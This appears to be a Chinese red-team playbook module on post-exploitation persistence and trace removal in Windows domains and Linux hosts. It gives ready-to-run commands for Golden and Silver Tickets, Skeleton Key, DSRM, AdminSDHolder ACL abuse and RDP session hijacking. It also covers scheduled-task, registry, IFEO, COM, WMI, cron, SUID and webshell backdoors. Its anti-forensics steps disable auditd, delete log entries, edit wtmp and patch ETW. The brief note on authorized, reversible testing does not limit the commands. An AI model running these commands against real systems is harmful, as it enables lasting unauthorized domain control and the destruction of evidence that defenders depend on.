# 持久化与痕迹

> 适用：已拿到本地管理员/SYSTEM 或域管，评估"重启、改密后还能不能回到目标"，以及本轮操作留下的可观测痕迹。

## 认什么

- **先看权限再谈持久化**：普通域用户先提权（`internal-07`），持久化意义不大；本地管理员/SYSTEM → 主机级；域管 + krbtgt 哈希 / 服务账户哈希 / DC 本地访问 → 域级。
- **看目的选技术**：长期回连选计划任务/服务；高隐蔽选 COM 劫持/WMI 订阅；不触碰 DC 选 Silver Ticket；要"万能钥匙"选 Skeleton Key（临时）。
- **看日志面**：Windows 的 4624/4688/4698/4720/7045/1102、Sysmon 1/3/8/10/11；Linux 的 `auth.log`/`wtmp`/`btmp`/`lastlog`/`audit.log`/`journal`/`.bash_history`。有实时转发到 SIEM 时，本地删日志基本无效。
- **防御侧只记一句**：上面每个动作都有对应日志可查，蓝队靠它们还原路径——所以攻击侧的重点是"少产生"，不是"多删除"。

## 打哪（命令）

### 域级持久化

**Golden Ticket**（域级最强，默认 10 年）：先 DCSync 拿 krbtgt 哈希与域 SID。

```bash
impacket-secretsdump DOMAIN/admin:PASS@DC_IP -just-dc-user krbtgt
impacket-lookupsid DOMAIN/user:PASS@DC_IP | head -1     # 取域 SID（去掉末尾 RID）
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
# 跨域信任：-extra-sid S-1-5-21-PARENT_SID-519（Enterprise Admins）
# Windows：Rubeus.exe golden /user:管 /domain:D /sid:S-1-5-21-xxx /krbtgt:H /ptt
```

**Silver Ticket**（不联系 DC，只对持有哈希的那个服务有效）：

| 目标服务 | SPN | 用途 |
|---|---|---|
| 文件共享/SMB | `cifs/HOST` | PsExec、读共享 |
| 主机综合 | `HOST/DC` | PsExec、WMI、计划任务 |
| MSSQL | `MSSQLSvc/DB:1433` | 数据库 |
| WinRM | `WSMAN/HOST` | 远程 PowerShell |
| LDAP | `LDAP/DC` | 目录查询、DCSync |
| RDP | `TERMSRV/HOST` | 远程桌面 |

```bash
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/target.domain.local Administrator
# Rubeus.exe silver /service:cifs/target /user:管 /domain:D /sid:S /rc4:H /ptt
klist && dir \\target\C$
```

**Skeleton Key**：域管 + SeDebugPrivilege + DC 内存访问，`privilege::debug` → `misc::skeleton`；之后任意域用户可用密码 `mimikatz` 登录，原密码仍有效。`netexec smb DC -u anyone -p mimikatz -d domain` 验证。**仅内存，DC 重启失效**，多 DC 要逐台注。

**DSRM**（DC 本地 Administrator，永久）：

```powershell
lsadump::sam                                    # 取 SAM 中 Administrator 的 NTLM = DSRM 哈希
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD -Force
sekurlsa::pth /domain:DC_HOSTNAME /user:Administrator /ntlm:DSRM_HASH /run:powershell.exe
```

```bash
impacket-psexec DC_HOSTNAME/Administrator@DC_IP -hashes :DSRM_HASH   # 域部分用 DC 主机名
netexec smb DC_IP -u Administrator -H DSRM_HASH --local-auth
```

**AdminSDHolder**：给 `CN=AdminSDHolder,CN=System,DC=domain,DC=local` 写 ACL，SDProp 每 60 分钟把它复制到所有受保护组；加 `WriteMembers` 比 FullControl 低调。

```bash
impacket-dacledit -action write -rights FullControl -principal attacker -target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" DOMAIN/admin:PASS -dc-ip DC_IP
# 或 Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,..." -PrincipalIdentity attacker -Rights All
# 等 60 分钟或 Invoke-ADSDPropagation → net rpc group addmem "Domain Admins" attacker ...
```

**Token / 会话**：`incognito` 的 `list_tokens -u` + `impersonate_token "DOMAIN\\Administrator"`；`netexec smb T -u A -p P -M impersonate`；SYSTEM 下 `tscon <会话ID> /dest:<当前会话>` 接管已断开的 RDP（仅 Server 2016 及以下，2019+ 需密码）。

### 主机级持久化

```cmd
:: 计划任务（SYSTEM 触发）
schtasks /create /tn "WinDefUpdate" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "HealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc minute /mo 30 /ru SYSTEM /f
:: 注册表
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "C:\ProgramData\updater.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\ProgramData\payload.exe" /f
:: IFEO 劫持辅助功能（锁屏连按 5 次 Shift 出 cmd）
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
:: 服务
sc create "WinDefSvc" binPath= "C:\Windows\legit-svc.exe" start= auto && sc start "WinDefSvc"
```

COM 劫持：HKCU 建与 HKLM 同 CLSID 的 `InprocServer32` 指向恶意 DLL（`ThreadingModel=Both`），优先于 HKLM 加载；常见目标 `{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}`、`{BCDE0395-E52F-467C-8E3D-C4579291692E}`。WMI 订阅是三组件，缺一不生效、删也要三件全删：`__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding`（可 `PowerLurk` 一键建、`Get-WmiEvent|Remove-WmiObject` 清）。`SharPersist -t schtask|reg|service|startupfolder -m add/remove` 可统一管理。

Linux：`~/.ssh/authorized_keys` 写公钥 → `ssh -i key`；`/etc/cron.d/` 落任务；`~/.bashrc` 追加；`/etc/systemd/system/*.service` + `systemctl enable`；SUID shell（`cp /bin/bash /tmp/.x && chmod u+s`）。Web 层留 webshell，位置优先静态资源目录/上传目录，别改首页。

### 痕迹：先不产生，再精准清

```bash
unset HISTFILE; export HISTSIZE=0 HISTFILESIZE=0; set +o history   # 会话级
auditctl -e 0                                                      # 比 kill -9 auditd 少一条停止日志
sed -i '/特定IP/d' /var/log/auth.log
utmpdump /var/log/wtmp > t.txt   # 编辑删行后 utmpdump -r < t.txt > /var/log/wtmp
journalctl --vacuum-time=1s      # 注意：会清全部 journal
```

Windows：关 `ScriptBlockLogging` 注册表项；优先 `.NET` 直接调用与 `powershell -version 2`（绕过 4104）；用 LOLBins（rundll32/mshta/certutil）与进程名伪装减少 4688 异常；必要时 patch `ntdll!EtwEventWrite`/`NtTraceEvent` 停 ETW。**绝不清空整份日志**——1102（Windows）/清 journal 本身是高优先级告警；要清就用事件日志编辑/`Invoke-Phant0m`/停 EventLog 服务改 evtx 这类精准手段。清理 PowerShell 历史：`Remove-Item (Get-PSReadlineOption).HistorySavePath`。

## 什么算成

- **重启或改密后能回来**：Golden Ticket 能 `dir \\DC\C$` 或 DCSync；Silver Ticket 能访问对应 SPN 服务；DSRM 哈希能 `--local-auth` 登录 DC；计划任务/服务在重启后按触发器产生新进程或新回连。
- 新建的账号/ACL 能实际用起来（登录成功、能改组），不是只写进注册表。
- 痕迹侧有对照证据：目标条目删除前后可复现，1102/104 未产生；若日志已实时转发，直接写"本地清理无效，已停止继续清理"。
- 每个持久化点都有**位置+名称+值+清理命令**四件套，能原样回滚。

## 假点

- Golden Ticket 时间偏差 >5 分钟、域 SID 错、krbtgt 已双轮换、票据没进 `KRB5CCNAME`（`klist` 看不到）。
- Silver Ticket 只对那一个服务有效，别当全域；服务账户改密即失效。
- Skeleton Key 重启即失效、多 DC 只注一台、目标开了 LSA 保护。
- DSRM 只拿到哈希没把 `DsrmAdminLogonBehavior` 置 2；或用域名而非 DC 主机名登录，报认证失败。
- AdminSDHolder 没等 SDProp（60 分钟）或没手动传播，就断言"已持久化"。
- 计划任务创建成功但 `/tr` 路径带空格没引号、运行账户无权限；WMI 只删了 filter，consumer/binding 还在（或反之）。
- 清日志：1102 是暴露不是隐藏；`journalctl --vacuum-time=1s` 清全部；本地删了但 SIEM 已收走。
- `~/.bashrc` 后门只对交互式 shell 生效；cron 最小粒度是分钟，不是"马上生效"。

## 与其他包联动

- 前置：`internal-02`（krbtgt/服务哈希）、`internal-03`（ACL/委派）、`internal-04`（DCSync/凭据）、`internal-05`（拿主机管理员）。
- 后续：`internal-06`（持久化通道跨网段）、`internal-10`（投放持久化载荷）。
- 持久化是写操作：按 `../../../../rules/20-min-harm.md` 只保留最小一条、可回滚，不删业务数据/不改他人配置；部署清单写进报告（`../../../../rules/40-evidence-report.md`），评估结束按清单清理。
